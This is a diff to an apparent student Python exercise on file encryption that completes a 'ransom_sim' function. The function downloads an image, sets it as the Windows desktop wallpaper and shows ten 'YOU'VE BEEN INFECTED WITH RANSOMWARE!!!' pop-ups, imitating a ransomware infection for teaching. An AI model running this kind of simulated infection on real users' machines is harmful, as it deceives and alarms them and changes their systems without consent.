@@ -1,4 +1,4 @@
-# Script: 08 - File Encryption (Part III) - INCOMPLETE
+# Script: 08 - File Encryption (Part III)
 # Author: Robert Gregor
 # Date of latest revision: 26 APR 23
 
@@ -65,6 +65,7 @@ from cryptography.fernet import Fernet
 import ctypes
 import tempfile
 import urllib.request
+import time
 
 def write_key():
     # Generate key and store in key variable
@@ -177,7 +178,19 @@ def decrypt_folder():
     print(f"\nYou have successfully decrpyted the {folder_path} folder!")
 
 def ransom_sim():
-    exit
+    # Set background image URL
+    background_image = "https://wallpapercave.com/wp/wp9680895.jpgg"
+    # Path variable sets image save location
+    path = os.path.join(os.path.expanduser('~'), 'Desktop', 'background.jpg')
+    # Download image and save to path
+    urllib.request.urlretrieve(background_image, path)
+    # Set download image as desktop background
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+    # Pause 2 seconds
+    time.sleep(2)
+    # Display 10 pop-up's
+    for _ in range(10):
+        ctypes.windll.user32.MessageBoxW(0, "YOU'VE BEEN INFECTED WITH RANSOMWARE!!!", "Message", 0x40 | 0x1)
 
 # Execute write_key() function
 write_key()
